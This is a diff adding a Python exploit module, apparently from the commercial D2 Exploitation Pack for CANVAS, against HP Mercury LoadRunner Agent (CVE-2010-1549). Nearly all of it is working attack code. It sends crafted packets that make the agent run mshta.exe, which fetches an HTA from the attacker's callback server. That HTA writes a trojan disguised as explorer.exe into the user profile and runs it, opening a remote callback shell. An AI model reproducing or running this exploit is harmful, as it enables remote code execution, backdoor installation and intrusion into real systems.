@@ -1,0 +1,369 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from libs.spkproxy import header, body
+from libs.canvasos import *
+from libs.tlslite.api import *
+from MOSDEF import pelib 
+
+import select
+import struct
+import zipfile
+import os
+import base64
+import thread
+
+
+# GUI info
+NAME = "HP Mercury LoadRunner Agent Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in HP Mercury LoadRunner Agent"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "HP"
+DOCUMENTATION['Date public'] = "2010.05.06"
+DOCUMENTATION["VersionsAffected"] = "HP Mercury LoadRunner < 9.50"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-080/"
+DOCUMENTATION["CVE Name"] = "CVE-2010-1549"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1549"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+The "command" parameter must be filled with its full path (ex. : c:\windows\system32\cmd.exe)
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.setInfo(DESCRIPTION)
+    	self.TROJANMODE = 0
+    	self.name = NAME       
+    	self.port = 54345
+    	self.httpport = 80
+    	self.version = 0
+    	self.cmd = ""
+    	self.param = ""
+    	self.trojanname = "index.hta"
+    	return
+
+
+    def file4hta(self, exename):
+    	evilprog = "explorer.exe"
+    	e = []
+    	
+    	for a in exename:
+    		for b in a:
+    			if b == "\r":
+    				d = "0d"
+    			elif b == "\n":
+    				d = "0a"
+    			elif b == "\0":
+    				d = "00"
+    			else:
+    				c = hex(ord(b))
+    				d = c.replace("0x", "")
+
+    			if len(d) == 1:
+    				d = "0"+d
+
+    			e.append(d)
+	
+    	i = 0
+    	j = 0
+    	l = len(e)
+
+    	hta = "<SCRIPT language=vbs>\n\n"
+    	
+    	while 1:
+    		hta += " prog = prog & \""
+
+    		while i != 24:
+    			hta += "%s," % e[j]
+    			
+    			if j == l-1:
+    				break
+    				
+    			i += 1
+    			j += 1
+
+    		if j == l-1:
+    			hta = hta[:-1] + "\"\n\n"
+    			break
+    			
+    		hta += "\"\n"
+    		i = 0
+
+    	hta += " tmp = Split(prog, \",\")\n"	
+    	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+    	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+    	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+    	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+    	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+    	hta += " For i = 0 To UBound(tmp)\n"
+    	hta += "   prog = Int(\"&H\" & tmp(i))\n"
+    	hta += "   f.Write Chr(prog)\n"
+    	hta += " Next\n\n"
+    	hta += " f.Close\n"
+    	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+    	hta += " self.Close\n"
+    	hta += "</SCRIPT>\n"
+
+    	return hta
+ 
+ 
+    def maketrojan(self):   
+    	t_os = canvasos("Windows")
+    	t_os.arch = "X86"
+        
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
+    	self.htafile = self.file4hta(self.mosdeftrojan)
+    	file(self.trojanname, "wb").write(self.htafile)
+    	self.setInfo("%s - done"%(NAME))
+    	ret = len(self.mosdeftrojan) != 0
+
+
+    def makesploit(self, clientheader, clientbody):        
+    	from libs.spkproxy import header, body
+    	h = header('SERVER')
+    	b = body()
+        
+    	self.maketrojan()
+                
+    	if clientheader.URL.count(self.trojanname):
+    		self.log("Sending MOSDEF trojan")
+    		f = open(self.trojanname, "rb")
+    		sploitstring = f.read()
+    		f.close()
+    		os.remove(self.trojanname)
+    		self.log("Sending %d bytes"%len(sploitstring))
+    		h.addHeader("Content-type","binary/octet-stream")
+    		h.addHeader("Connection","close")
+    		b.setBody(sploitstring)
+
+    	return h, b
+
+
+    def neededListenerTypes(self):
+    	from canvasengine import WIN32MOSDEF
+    	return [WIN32MOSDEF]
+
+
+    #################################################################################################################
+    # Code from httpserver.py
+    def listen(self):
+        self.getargs()
+        s=self.gettcplistener(self.httpport, "0.0.0.0")
+
+        if not s:
+            if self.httpport < 1024:
+                self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
+                         "you can try to bind to a higher port" % self.httpport)
+            else:
+                self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.httpport)
+            return 0
+        s.set_timeout(5)
+        self.s=s
+        return s 
+
+    def accept(self, s=None ):
+        """
+        Try to accept one connection
+        returns true if we found one
+        """
+        #we loop on this ,so no annoying printouts here
+        #self.log("Accepting connection")
+        if s==None:
+            s=self.s 
+        try:
+            infd,addr=s.accept()
+        except timeoutsocket.Timeout:
+            #self.log("Timed out - no accept yet")
+            return 
+        if infd==-1:
+            return
+
+        #else we have an infd
+        self.handle(infd)
+        return True #handled connection
+        
+    def handle(self, infd): 
+        self.log("Handling connection")
+        clientheader = header(state = "SERVER")
+        clientheader.ssl = self.ssl
+        ret = clientheader.readdata(infd)
+        clientbody = body()
+        
+        if clientheader.gotGoodHeader():
+            if clientheader.bodySize()>0 or clientheader.wasChunked:
+                self.log("Reading body")
+                clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+                self.log("Read body")
+
+        self.log("Creating exploit response")
+
+        servheader,servbody = self.makesploit(clientheader,clientbody)
+        
+        self.log("Responding")
+        
+        bodydata="".join(servbody.data)
+                    
+        #now we respond...
+        response = ""
+        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+        self.log(response)
+
+        for akey in servheader.headerValuesDict.keys():
+            if akey not in [ "Content-Length", "Content-length"]:
+                response += servheader.grabHeader(akey)
+        self.log("Sending header data of %d bytes"%len(response))
+        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
+        if not chunked:
+            response+="Content-Length: "+str(len(bodydata))+"\r\n"
+        response+="\r\n"
+        response+="".join(bodydata)
+        self.log("Total response length is %d bytes"%len(response))
+        try:
+            infd.sendall(response)
+        except socket.error:
+            self.log("Connection closed by peer")
+        self.log("Response sent")
+        infd.close() #connection close - later on we'll keep it.
+        return 
+    #
+    #################################################################################################################
+        
+        
+    def startHTTPServer(self):
+    	s = self.listen()
+        
+    	if not s:
+    		self.log("Failed to listen - not running")
+    		return 0
+    		
+    	while 1:
+    		if self.state==self.HALT:
+    			self.s.close()
+    			break
+    			
+    		self.accept()
+
+    	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.httpport))
+        
+    	return 1    	
+    
+    
+    def padded_str(self, str):
+    	return struct.pack('>L', len(str)) + str + "\x00" * (4 - len(str)%4)
+		
+				  
+    def run(self):
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.httpport = int(self.argsDict.get("httpport", self.httpport))                    		
+    	self.port = int(self.argsDict.get("port", self.port))
+    	self.cmd = self.argsDict.get("cmd", self.cmd)
+    	self.param = self.argsDict.get("param", self.param)    	
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                
+    
+    	# Init some parameters
+    	guid = base64.b64encode("d2d2d2d2d2d2d2d2d2")
+    	server_name = "d2"
+    	pid = random.randint(0x1, 0xffff)
+    	tid = random.randint(0x1, 0xffff) 
+    	server_ip = ""
+    	server_port = ""
+
+    	if self.cmd == "":		
+    		self.TROJANMODE = 1     		
+    		command = "C:\\Windows\\system32\\mshta.exe"
+    		thread.start_new_thread(self.startHTTPServer,())
+    	else:
+    		command = self.cmd
+	
+    	if self.param == "":		
+    		parameters = "http://" + self.callback.ip + ":" + str(self.httpport) + "/" + self.trojanname
+    	else:
+    		parameters = self.param								    		    	
+
+			# Send exploit																												  
+    	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    	try:
+    		s.connect((self.host, self.port))
+    	except:
+    		self.log("Could not connect to port %s:%s" % (self.host, self.port))
+			                
+    	req2_1 = struct.pack('>L', 0x19) + guid + "0"
+
+    	req2_2 =  struct.pack('>L', 0x7) + self.padded_str(server_name + ";" + str(pid) + ";" + str(tid))
+    	req =  "(-server_type=8)" 
+    	req += "(-server_name=" + server_name + ")" 
+    	req += "(-server_full_name=" + server_name + ")" 
+    	req += "(-server_ip_name=" + server_ip + ")" 
+    	req += "(-server_port=" + server_port + ")"
+    	req += "(-server_fd_secondary=4)"
+    	req += "(-guid_identifier=" + guid + ")"
+    	req2_2 += self.padded_str(req)
+    	req2_2 += struct.pack('>L', 0x7530)
+    	req2_2 = struct.pack('>L', 4 + len(req2_2)) + req2_2
+    	req2_2 = struct.pack('>L', 0x1c) + struct.pack('>L', 0x05) + struct.pack('>L', 0x01) + "\xff"*16 + req2_2
+    	req2_2 = struct.pack('>L', len(req2_2)) + req2_2
+
+    	req2_3 =  struct.pack('>L', 0x437) + struct.pack('>L', 0) + struct.pack('>L', 0x31) + struct.pack('>L', 1) + struct.pack('>L', 0x31000000)
+    	req2_3 += self.padded_str(command) + self.padded_str(parameters) + struct.pack('>L', 0)
+    	req2_3 = struct.pack('>L', 4 + len(req2_3)) + req2_3
+    	req2_3 = struct.pack('>L', 0x18) + struct.pack('>L', 0x04) + "\xff"*16 + req2_3
+    	req2_3 = struct.pack('>L', len(req2_3)) + req2_3
+
+    	data = req2_1 + req2_2 + req2_3
+
+    	s.send(data)
+    	s.close()
+
+    	if (self.TROJANMODE == 1):
+    		while 1:
+    			time.sleep(1)
+					                  
+    	return 1
+    	
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O httpport:http_port] [-O cmd:command] [-O param:parameters]\n" % sys.argv[0]
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
